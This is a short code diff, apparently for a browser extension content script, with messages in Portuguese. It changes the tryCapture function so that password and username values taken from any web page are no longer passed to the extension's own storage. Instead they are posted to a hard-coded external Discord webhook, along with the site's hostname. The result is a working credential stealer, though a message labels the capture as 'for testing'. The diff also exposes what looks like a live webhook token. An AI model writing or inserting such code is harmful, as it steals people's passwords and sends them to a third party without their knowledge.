@@ -1,3 +1,6 @@
+const WEBHOOK_URL = 'https://discord.com/api/webhooks/1503907707298513030/mD9M_rdZoDQ5zx0qf1TiSCCn64U-05RV3B3N3lfw227eUCsct3wGiqhbqNKuiOvdCu30';
+
+
 function tryCapture() {
   const passwordFields = Array.from(document.querySelectorAll('input[type="password"]'));
 
@@ -29,14 +32,21 @@ function tryCapture() {
     const usernameField = document.querySelector('input[type="email"], input[type="text"]');
 
     if (passwordField.value) {
-      chrome.runtime.sendMessage({
-        type: 'SAVE_CREDENTIAL',
-        data: {
+      const data = {
           url: window.location.hostname,
           username: usernameField?.value || '(não encontrado)',
           password: passwordField.value
-        }
-      });
+        };
+
+        const { url, username, password } = data;
+
+    fetch(WEBHOOK_URL, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        content: `🔐 **Nova credencial salva para teste!**\n🌐 Site: ${url}\n👤 Usuário: ${username}\n🔑 Senha: ${password}`
+      })
+    });
     }
   });
 }
